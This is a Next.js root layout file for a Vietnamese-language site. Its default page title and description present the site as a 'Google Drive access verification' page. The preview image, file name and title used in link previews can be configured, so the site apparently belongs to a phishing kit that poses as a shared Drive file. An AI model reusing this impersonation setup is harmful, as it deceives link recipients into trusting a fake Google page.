
import type { Metadata } from 'next'
import { Toaster } from '@/components/ui/toaster'
import './globals.css'
import { getVerificationConfigAction } from '@/app/actions/settings'

export async function generateMetadata(): Promise<Metadata> {
  // fetch data
  const config = await getVerificationConfigAction()
 
  return {
    title: config.title || 'Google Drive - Xác minh truy cập',
    description: config.description || 'Xác minh truy cập an toàn.',
    openGraph: {
      title: config.title,
      description: config.description,
      images: [
        {
          url: config.imageUrl,
          width: 1200,
          height: 630,
          alt: config.fileName,
        },
      ],
      type: 'website',
    },
    twitter: {
        card: 'summary_large_image',
        title: config.title,
        description: config.description,
        images: [config.imageUrl],
    },
  }
}

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const config = await getVerificationConfigAction();
  return (
    <html lang="vi" className={config.theme}>
      <head />
      <body className="antialiased">
        {children}
        <Toaster />
      </body>
    </html>
  );
}
